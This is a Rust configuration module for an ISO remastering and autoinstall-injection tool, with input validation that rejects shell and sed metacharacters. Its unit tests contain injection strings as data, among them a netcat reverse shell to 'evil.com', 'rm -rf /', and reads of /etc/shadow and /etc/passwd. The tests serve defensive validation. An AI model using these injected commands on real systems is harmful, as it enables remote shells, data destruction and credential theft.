use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use crate::error::{EngineError, EngineResult};

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, PartialOrd, Ord, Hash)]
#[serde(rename_all = "lowercase")]
pub enum Distro {
    Ubuntu,
    Mint,
    Fedora,
    Arch,
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum ProfileKind {
    Minimal,
    Desktop,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum ToolStatus {
    Passed,
    Failed,
    Unavailable,
    Skipped,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(untagged)]
pub enum IsoSource {
    Path(PathBuf),
    Url(String),
}

impl Default for IsoSource {
    fn default() -> Self {
        IsoSource::Path(PathBuf::new())
    }
}

impl IsoSource {
    #[must_use]
    pub fn from_raw(input: impl Into<String>) -> Self {
        let raw = input.into();
        if raw.starts_with("http://") || raw.starts_with("https://") {
            Self::Url(raw)
        } else {
            Self::Path(PathBuf::from(raw))
        }
    }

    #[must_use]
    pub fn display_value(&self) -> String {
        match self {
            Self::Path(path) => path.display().to_string(),
            Self::Url(url) => url.clone(),
        }
    }

    #[must_use]
    pub fn is_remote(&self) -> bool {
        matches!(self, Self::Url(_))
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[allow(clippy::struct_excessive_bools)]
pub struct ScanPolicy {
    #[serde(default = "default_true")]
    pub enable_sbom: bool,
    #[serde(default = "default_true")]
    pub enable_trivy: bool,
    #[serde(default)]
    pub enable_syft_grype: bool,
    #[serde(default)]
    pub enable_open_scap: bool,
    #[serde(default = "default_true")]
    pub enable_secrets_scan: bool,
    #[serde(default)]
    pub strict_secrets: bool,
}

impl Default for ScanPolicy {
    fn default() -> Self {
        Self {
            enable_sbom: default_true(),
            enable_trivy: default_true(),
            enable_syft_grype: false,
            enable_open_scap: false,
            enable_secrets_scan: default_true(),
            strict_secrets: false,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TestingPolicy {
    #[serde(default = "default_true")]
    pub bios: bool,
    #[serde(default = "default_true")]
    pub uefi: bool,
    #[serde(default = "default_true")]
    pub smoke: bool,
}

impl Default for TestingPolicy {
    fn default() -> Self {
        Self {
            bios: true,
            uefi: true,
            smoke: true,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BuildConfig {
    pub name: String,
    pub source: IsoSource,
    #[serde(default)]
    pub overlay_dir: Option<PathBuf>,
    #[serde(default)]
    pub output_label: Option<String>,
    #[serde(default = "default_profile")]
    pub profile: ProfileKind,
    #[serde(default)]
    pub auto_scan: bool,
    #[serde(default)]
    pub auto_test: bool,
    #[serde(default)]
    pub scanning: ScanPolicy,
    #[serde(default)]
    pub testing: TestingPolicy,
    #[serde(default)]
    pub keep_workdir: bool,
    /// If set, the downloaded ISO's SHA-256 must match before any operation proceeds.
    #[serde(default)]
    pub expected_sha256: Option<String>,
}

impl BuildConfig {
    /// # Errors
    /// Returns an error if the YAML is invalid or fails validation.
    pub fn from_yaml_str(raw: &str) -> EngineResult<Self> {
        let cfg: Self = serde_yaml::from_str(raw)?;
        cfg.validate()?;
        Ok(cfg)
    }

    /// # Errors
    /// Returns an error if the file cannot be read or the YAML is invalid.
    pub fn from_path(path: &Path) -> EngineResult<Self> {
        let raw = std::fs::read_to_string(path)?;
        Self::from_yaml_str(&raw)
    }

    /// # Errors
    /// Returns an error if any required field is missing or invalid.
    pub fn validate(&self) -> EngineResult<()> {
        if self.name.trim().is_empty() {
            return Err(EngineError::InvalidConfig(
                "name cannot be empty".to_string(),
            ));
        }

        match &self.source {
            IsoSource::Path(path) => {
                if path.as_os_str().is_empty() {
                    return Err(EngineError::InvalidConfig(
                        "source path cannot be empty".to_string(),
                    ));
                }
            }
            IsoSource::Url(url) => {
                if !(url.starts_with("http://") || url.starts_with("https://")) {
                    return Err(EngineError::InvalidConfig(
                        "source URL must start with http:// or https://".to_string(),
                    ));
                }
            }
        }

        if let Some(path) = &self.overlay_dir {
            if !path.exists() {
                return Err(EngineError::InvalidConfig(format!(
                    "overlay_dir does not exist: {}",
                    path.display()
                )));
            }
            if !path.is_dir() {
                return Err(EngineError::InvalidConfig(format!(
                    "overlay_dir must be a directory: {}",
                    path.display()
                )));
            }
        }

        if let Some(label) = &self.output_label {
            if label.trim().is_empty() {
                return Err(EngineError::InvalidConfig(
                    "output_label cannot be blank".to_string(),
                ));
            }
            if label.len() > 32 {
                return Err(EngineError::InvalidConfig(
                    "output_label must be 32 characters or fewer".to_string(),
                ));
            }
        }

        if self.auto_test && !self.testing.smoke {
            return Err(EngineError::InvalidConfig(
                "auto_test requires testing.smoke=true".to_string(),
            ));
        }

        Ok(())
    }
}

const fn default_true() -> bool {
    true
}

const fn default_profile() -> ProfileKind {
    ProfileKind::Minimal
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct SshConfig {
    #[serde(default)]
    pub authorized_keys: Vec<String>,
    /// None = engine decides (false if keys present, true otherwise)
    #[serde(default)]
    pub allow_password_auth: Option<bool>,
    /// None = defaults to true (install openssh-server)
    #[serde(default)]
    pub install_server: Option<bool>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct NetworkConfig {
    #[serde(default)]
    pub dns_servers: Vec<String>,
    #[serde(default)]
    pub ntp_servers: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct UserConfig {
    #[serde(default)]
    pub groups: Vec<String>,
    #[serde(default)]
    pub shell: Option<String>,
    #[serde(default)]
    pub sudo_nopasswd: bool,
    #[serde(default)]
    pub sudo_commands: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct FirewallConfig {
    #[serde(default)]
    pub enabled: bool,
    #[serde(default)]
    pub default_policy: Option<String>,
    #[serde(default)]
    pub allow_ports: Vec<String>,
    #[serde(default)]
    pub deny_ports: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct ProxyConfig {
    #[serde(default)]
    pub http_proxy: Option<String>,
    #[serde(default)]
    pub https_proxy: Option<String>,
    #[serde(default)]
    pub no_proxy: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct SwapConfig {
    pub size_mb: u32,
    #[serde(default)]
    pub filename: Option<String>,
    #[serde(default)]
    pub swappiness: Option<u8>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct ContainerConfig {
    #[serde(default)]
    pub docker: bool,
    #[serde(default)]
    pub podman: bool,
    #[serde(default)]
    pub docker_users: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct GrubConfig {
    #[serde(default)]
    pub timeout: Option<u32>,
    #[serde(default)]
    pub cmdline_extra: Vec<String>,
    #[serde(default)]
    pub default_entry: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct InjectConfig {
    pub source: IsoSource,
    /// Optional: if None, YAML is generated from fields below
    #[serde(default)]
    pub autoinstall_yaml: Option<PathBuf>,
    pub out_name: String,
    #[serde(default)]
    pub output_label: Option<String>,
    /// If set, the downloaded ISO's SHA-256 must match before injection proceeds.
    #[serde(default)]
    pub expected_sha256: Option<String>,

    // Identity
    #[serde(default)]
    pub hostname: Option<String>,
    #[serde(default)]
    pub username: Option<String>,
    /// Plaintext; hashed to $6$ format before writing
    #[serde(default)]
    pub password: Option<String>,
    #[serde(default)]
    pub realname: Option<String>,

    // SSH
    #[serde(default)]
    pub ssh: SshConfig,

    // Network
    #[serde(default)]
    pub network: NetworkConfig,

    // System
    #[serde(default)]
    pub timezone: Option<String>,
    #[serde(default)]
    pub locale: Option<String>,
    #[serde(default)]
    pub keyboard_layout: Option<String>,

    // Storage/Apt
    #[serde(default)]
    pub storage_layout: Option<String>, // "lvm" | "direct" | "zfs"
    #[serde(default)]
    pub apt_mirror: Option<String>,

    // Packages
    #[serde(default)]
    pub extra_packages: Vec<String>,

    // Wallpaper
    #[serde(default)]
    pub wallpaper: Option<PathBuf>,

    // Escape hatches
    #[serde(default)]
    pub extra_late_commands: Vec<String>,
    #[serde(default)]
    pub no_user_interaction: bool,

    // User / access management
    #[serde(default)]
    pub user: UserConfig,

    // Firewall
    #[serde(default)]
    pub firewall: FirewallConfig,

    // Network extras
    #[serde(default)]
    pub proxy: ProxyConfig,
    #[serde(default)]
    pub static_ip: Option<String>,
    #[serde(default)]
    pub gateway: Option<String>,

    // Services
    #[serde(default)]
    pub enable_services: Vec<String>,
    #[serde(default)]
    pub disable_services: Vec<String>,

    // Kernel
    #[serde(default)]
    pub sysctl: Vec<(String, String)>,

    // Swap
    #[serde(default)]
    pub swap: Option<SwapConfig>,

    // APT repositories (Ubuntu/Debian)
    #[serde(default)]
    pub apt_repos: Vec<String>,

    // DNF repositories (Fedora/RHEL) — each entry is a full `[id]\nbaseurl=...` stanza
    // or a shorthand URL string that gets wrapped into a minimal stanza.
    #[serde(default)]
    pub dnf_repos: Vec<String>,

    // Optional override for the primary DNF mirror base URL.
    #[serde(default)]
    pub dnf_mirror: Option<String>,

    // Pacman repositories (Arch Linux) — each entry is a `Server = https://...` mirror line.
    #[serde(default)]
    pub pacman_repos: Vec<String>,

    // Optional primary pacman mirror URL (written as the first Server= line in mirrorlist).
    #[serde(default)]
    pub pacman_mirror: Option<String>,

    // Container runtimes
    #[serde(default)]
    pub containers: ContainerConfig,

    // GRUB
    #[serde(default)]
    pub grub: GrubConfig,

    // LUKS encryption
    #[serde(default)]
    pub encrypt: bool,
    #[serde(default)]
    pub encrypt_passphrase: Option<String>,

    // Custom fstab entries
    #[serde(default)]
    pub mounts: Vec<String>,

    // Cloud-init runcmd equivalent
    #[serde(default)]
    pub run_commands: Vec<String>,

    // Target distro — None means Ubuntu (default, existing behaviour unchanged)
    #[serde(default)]
    pub distro: Option<Distro>,
}

impl InjectConfig {
    /// Validate structured fields to prevent shell injection in late-commands.
    /// Fields like `run_commands` and `extra_late_commands` are intentional
    /// escape hatches and are NOT validated here.
    ///
    /// # Errors
    /// Returns [`EngineError::InvalidConfig`] if any field contains shell-unsafe characters.
    #[allow(clippy::too_many_lines)]
    pub fn validate(&self) -> EngineResult<()> {
        // Regex-like check: only allow safe characters in structured fields.
        fn is_safe_identifier(s: &str, field: &str) -> EngineResult<()> {
            if s.is_empty() {
                return Ok(());
            }
            if s.chars()
                .all(|c| c.is_alphanumeric() || matches!(c, '-' | '_' | '.'))
            {
                Ok(())
            } else {
                Err(EngineError::InvalidConfig(format!(
                    "{field} contains unsafe characters: {s:?} (only alphanumeric, dash, underscore, dot allowed)"
                )))
            }
        }

        fn is_safe_path(s: &str, field: &str) -> EngineResult<()> {
            if s.is_empty() {
                return Ok(());
            }
            if s.chars()
                .all(|c| c.is_alphanumeric() || matches!(c, '/' | '-' | '_' | '.' | '+'))
            {
                Ok(())
            } else {
                Err(EngineError::InvalidConfig(format!(
                    "{field} contains unsafe characters: {s:?}"
                )))
            }
        }

        fn is_safe_port(s: &str, field: &str) -> EngineResult<()> {
            // Accept "22", "22/tcp", "80:443/tcp", or named services like "ssh"
            if s.is_empty() {
                return Ok(());
            }
            if s.chars()
                .all(|c| c.is_alphanumeric() || matches!(c, '/' | ':'))
            {
                Ok(())
            } else {
                Err(EngineError::InvalidConfig(format!(
                    "{field} contains unsafe characters: {s:?}"
                )))
            }
        }

        if let Some(h) = &self.hostname {
            is_safe_identifier(h, "hostname")?;
        }
        if let Some(u) = &self.username {
            is_safe_identifier(u, "username")?;
        }
        if let Some(r) = &self.realname {
            // Realname can contain spaces
            if r.chars()
                .any(|c| matches!(c, ';' | '&' | '|' | '$' | '`' | '\'' | '"' | '\\' | '\n'))
            {
                return Err(EngineError::InvalidConfig(format!(
                    "realname contains shell metacharacters: {r:?}"
                )));
            }
        }

        // User config
        for g in &self.user.groups {
            is_safe_identifier(g, "group")?;
        }
        if let Some(shell) = &self.user.shell {
            is_safe_path(shell, "shell")?;
        }

        // Services
        for svc in &self.enable_services {
            is_safe_identifier(svc, "enable_service")?;
        }
        for svc in &self.disable_services {
            is_safe_identifier(svc, "disable_service")?;
        }

        // Firewall
        if let Some(policy) = &self.firewall.default_policy {
            is_safe_identifier(policy, "firewall_policy")?;
        }
        for port in &self.firewall.allow_ports {
            is_safe_port(port, "allow_port")?;
        }
        for port in &self.firewall.deny_ports {
            is_safe_port(port, "deny_port")?;
        }

        // Sysctl keys
        for (key, val) in &self.sysctl {
            is_safe_identifier(key, "sysctl key")?;
            // Sysctl values can be numeric or simple strings
            if val
                .chars()
                .any(|c| matches!(c, ';' | '&' | '|' | '$' | '`' | '\'' | '"' | '\\' | '\n'))
            {
                return Err(EngineError::InvalidConfig(format!(
                    "sysctl value contains shell metacharacters: {val:?}"
                )));
            }
        }

        // Sudo commands — these are written into sudoers, so block metacharacters
        // that could break sudoers syntax or inject shell commands.
        for cmd in &self.user.sudo_commands {
            if cmd
                .chars()
                .any(|c| matches!(c, ';' | '&' | '|' | '$' | '`' | '\'' | '"' | '\\' | '\n'))
            {
                return Err(EngineError::InvalidConfig(format!(
                    "sudo_command contains shell metacharacters: {cmd:?}"
                )));
            }
        }

        // APT repos — written via echo into sources.list files
        for repo in &self.apt_repos {
            if repo
                .chars()
                .any(|c| matches!(c, ';' | '&' | '|' | '$' | '`' | '\'' | '"' | '\\' | '\n'))
            {
                return Err(EngineError::InvalidConfig(format!(
                    "apt_repo contains shell metacharacters: {repo:?}"
                )));
            }
        }

        // Mount entries — written into fstab via echo
        for entry in &self.mounts {
            if entry
                .chars()
                .any(|c| matches!(c, ';' | '&' | '|' | '$' | '`' | '\'' | '"' | '\\' | '\n'))
            {
                return Err(EngineError::InvalidConfig(format!(
                    "mount entry contains shell metacharacters: {entry:?}"
                )));
            }
        }

        // APT mirror — used in YAML and potentially late-commands
        if let Some(mirror) = &self.apt_mirror {
            if mirror
                .chars()
                .any(|c| matches!(c, ';' | '&' | '|' | '$' | '`' | '\'' | '"' | '\\' | '\n'))
            {
                return Err(EngineError::InvalidConfig(format!(
                    "apt_mirror contains shell metacharacters: {mirror:?}"
                )));
            }
        }

        // Proxy URLs — written to /etc/environment via echo
        for (field, val) in [
            ("http_proxy", &self.proxy.http_proxy),
            ("https_proxy", &self.proxy.https_proxy),
        ] {
            if let Some(url) = val {
                if url
                    .chars()
                    .any(|c| matches!(c, ';' | '&' | '|' | '$' | '`' | '\'' | '"' | '\\' | '\n'))
                {
                    return Err(EngineError::InvalidConfig(format!(
                        "{field} contains shell metacharacters: {url:?}"
                    )));
                }
            }
        }

        // no_proxy entries — written to /etc/environment
        for entry in &self.proxy.no_proxy {
            if entry
                .chars()
                .any(|c| matches!(c, ';' | '&' | '|' | '$' | '`' | '\'' | '"' | '\\' | '\n'))
            {
                return Err(EngineError::InvalidConfig(format!(
                    "no_proxy contains shell metacharacters: {entry:?}"
                )));
            }
        }

        // DNS servers — used in cloud-init YAML and potentially resolv.conf commands
        for dns in &self.network.dns_servers {
            is_safe_identifier(dns, "dns_server")?;
        }

        // NTP servers — used in printf commands for timesyncd.conf
        for ntp in &self.network.ntp_servers {
            is_safe_identifier(ntp, "ntp_server")?;
        }

        // Container users
        for u in &self.containers.docker_users {
            is_safe_identifier(u, "docker_user")?;
        }

        // Swap filename
        if let Some(swap) = &self.swap {
            if let Some(fname) = &swap.filename {
                is_safe_path(fname, "swap_filename")?;
            }
        }

        // GRUB — default_entry and cmdline_extra are interpolated into sed s///
        // patterns, so block shell metacharacters AND the sed delimiter (/).
        if let Some(entry) = &self.grub.default_entry {
            if entry.chars().any(|c| {
                matches!(
                    c,
                    ';' | '&' | '|' | '$' | '`' | '\'' | '"' | '\\' | '\n' | '/'
                )
            }) {
                return Err(EngineError::InvalidConfig(format!(
                    "grub_default contains shell/sed metacharacters: {entry:?}"
                )));
            }
        }
        for param in &self.grub.cmdline_extra {
            if param
                .chars()
                .any(|c| matches!(c, ';' | '&' | '|' | '$' | '`' | '\'' | '\\' | '\n' | '/'))
            {
                return Err(EngineError::InvalidConfig(format!(
                    "grub_cmdline contains shell/sed metacharacters: {param:?}"
                )));
            }
        }

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_url_source() {
        let source = IsoSource::from_raw("https://example.test/test.iso");
        assert!(matches!(source, IsoSource::Url(_)));
    }

    #[test]
    fn rejects_missing_overlay_dir() {
        let cfg = BuildConfig {
            name: "demo".to_string(),
            source: IsoSource::from_raw("/tmp/base.iso"),
            overlay_dir: Some(PathBuf::from("/definitely/missing")),
            output_label: None,
            profile: ProfileKind::Minimal,
            auto_scan: false,
            auto_test: false,
            scanning: ScanPolicy::default(),
            testing: TestingPolicy::default(),
            keep_workdir: false,
            expected_sha256: None,
        };

        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_rejects_shell_metachar_in_username() {
        let cfg = InjectConfig {
            username: Some("admin; rm -rf /".into()),
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_rejects_shell_metachar_in_port() {
        let cfg = InjectConfig {
            firewall: FirewallConfig {
                allow_ports: vec!["22; nc -e /bin/sh evil.com".into()],
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_accepts_valid_fields() {
        let cfg = InjectConfig {
            hostname: Some("web-server.lab".into()),
            username: Some("admin".into()),
            user: UserConfig {
                groups: vec!["docker".into(), "sudo".into()],
                ..Default::default()
            },
            firewall: FirewallConfig {
                allow_ports: vec!["22/tcp".into(), "80:443/tcp".into()],
                ..Default::default()
            },
            enable_services: vec!["sshd".into(), "docker.service".into()],
            ..Default::default()
        };
        assert!(cfg.validate().is_ok());
    }

    #[test]
    fn grub_default_allows_spaces_and_commas() {
        // GRUB menu titles routinely contain spaces and commas, e.g.
        // "Ubuntu, with Linux 6.x-generic" — these must not be rejected.
        let cfg = InjectConfig {
            grub: GrubConfig {
                default_entry: Some("Ubuntu, with Linux 6.x-generic".into()),
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_ok());
    }

    #[test]
    fn grub_default_rejects_shell_metachar() {
        let cfg = InjectConfig {
            grub: GrubConfig {
                default_entry: Some("Ubuntu$(rm -rf /)".into()),
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn grub_default_rejects_sed_delimiter() {
        // Forward slash breaks the sed s/// delimiter and can inject sed commands
        let cfg = InjectConfig {
            grub: GrubConfig {
                default_entry: Some("foo/e cat /etc/shadow".into()),
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn grub_cmdline_rejects_sed_delimiter() {
        let cfg = InjectConfig {
            grub: GrubConfig {
                cmdline_extra: vec!["quiet/e id".into()],
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn grub_cmdline_accepts_valid_params() {
        let cfg = InjectConfig {
            grub: GrubConfig {
                cmdline_extra: vec![
                    "quiet".into(),
                    "splash".into(),
                    "nomodeset".into(),
                    "intel_iommu=on".into(),
                ],
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_ok());
    }

    #[test]
    fn inject_rejects_shell_metachar_in_sudo_command() {
        let cfg = InjectConfig {
            user: UserConfig {
                sudo_commands: vec!["ALL; rm -rf /".into()],
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_rejects_shell_metachar_in_apt_repo() {
        let cfg = InjectConfig {
            apt_repos: vec!["ppa:user/repo'; echo pwned".into()],
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_rejects_shell_metachar_in_mount() {
        let cfg = InjectConfig {
            mounts: vec!["/dev/sda1 /mnt ext4 defaults 0 0; whoami".into()],
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_rejects_shell_metachar_in_apt_mirror() {
        let cfg = InjectConfig {
            apt_mirror: Some("http://mirror.example.com$(id)".into()),
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_rejects_shell_metachar_in_proxy() {
        let cfg = InjectConfig {
            proxy: ProxyConfig {
                http_proxy: Some("http://proxy.example.com; cat /etc/passwd".into()),
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_rejects_unsafe_dns_server() {
        let cfg = InjectConfig {
            network: NetworkConfig {
                dns_servers: vec!["8.8.8.8; rm -rf /".into()],
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_rejects_unsafe_ntp_server() {
        let cfg = InjectConfig {
            network: NetworkConfig {
                ntp_servers: vec!["ntp.example.com$(id)".into()],
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_accepts_valid_sudo_commands() {
        let cfg = InjectConfig {
            user: UserConfig {
                sudo_commands: vec!["/usr/bin/apt".into(), "/usr/sbin/reboot".into()],
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_ok());
    }

    #[test]
    fn inject_accepts_valid_apt_repos() {
        let cfg = InjectConfig {
            apt_repos: vec!["deb http://archive.ubuntu.com/ubuntu noble main".into()],
            ..Default::default()
        };
        assert!(cfg.validate().is_ok());
    }

    #[test]
    fn inject_accepts_valid_mount_entries() {
        let cfg = InjectConfig {
            mounts: vec!["/dev/sda1 /mnt ext4 defaults 0 0".into()],
            ..Default::default()
        };
        assert!(cfg.validate().is_ok());
    }

    #[test]
    fn scan_policy_defaults_enable_local_checks() {
        let policy = ScanPolicy::default();

        assert!(policy.enable_sbom);
        assert!(policy.enable_trivy);
        assert!(policy.enable_secrets_scan);
        assert!(!policy.enable_syft_grype);
        assert!(!policy.enable_open_scap);
    }

    // ── IsoSource ────────────────────────────────────────────────────────────

    #[test]
    fn iso_source_from_raw_detects_https_url() {
        let src = IsoSource::from_raw("https://releases.ubuntu.com/noble/ubuntu.iso");
        assert!(src.is_remote());
        assert!(matches!(src, IsoSource::Url(_)));
    }

    #[test]
    fn iso_source_from_raw_detects_http_url() {
        let src = IsoSource::from_raw("http://mirror.example.com/ubuntu.iso");
        assert!(src.is_remote());
    }

    #[test]
    fn iso_source_from_raw_treats_local_path_as_path() {
        let src = IsoSource::from_raw("/tmp/ubuntu.iso");
        assert!(!src.is_remote());
        assert!(matches!(src, IsoSource::Path(_)));
    }

    #[test]
    fn iso_source_display_value_url() {
        let url = "https://example.com/ubuntu.iso";
        let src = IsoSource::from_raw(url);
        assert_eq!(src.display_value(), url);
    }

    #[test]
    fn iso_source_display_value_path() {
        let src = IsoSource::from_raw("/tmp/ubuntu.iso");
        assert_eq!(src.display_value(), "/tmp/ubuntu.iso");
    }

    // ── InjectConfig validate edge cases ─────────────────────────────────────

    #[test]
    fn inject_rejects_semicolon_in_hostname() {
        let cfg = InjectConfig {
            hostname: Some("bad;host".into()),
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_accepts_hostname_with_dash_and_dot() {
        let cfg = InjectConfig {
            hostname: Some("my-host.example.com".into()),
            ..Default::default()
        };
        assert!(cfg.validate().is_ok());
    }

    #[test]
    fn inject_rejects_newline_in_realname() {
        let cfg = InjectConfig {
            realname: Some("Jane\nDoe".into()),
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_accepts_realname_with_space() {
        let cfg = InjectConfig {
            realname: Some("Jane Doe".into()),
            ..Default::default()
        };
        assert!(cfg.validate().is_ok());
    }

    #[test]
    fn inject_rejects_backtick_in_service_name() {
        let cfg = InjectConfig {
            enable_services: vec!["ssh`whoami`".into()],
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    // ── BuildConfig validation ────────────────────────────────────────────────

    #[test]
    fn build_config_from_yaml_str_minimal() {
        // IsoSource is #[serde(untagged)] — deserializes from bare string
        let yaml = "name: test-build\nsource: /tmp/ubuntu.iso\n";
        let result = BuildConfig::from_yaml_str(yaml);
        assert!(result.is_ok(), "parse failed: {result:?}");
    }

    #[test]
    fn build_config_rejects_empty_name() {
        let yaml = "name: ''\nsource: /tmp/ubuntu.iso\n";
        let result = BuildConfig::from_yaml_str(yaml);
        assert!(result.is_err());
    }
}
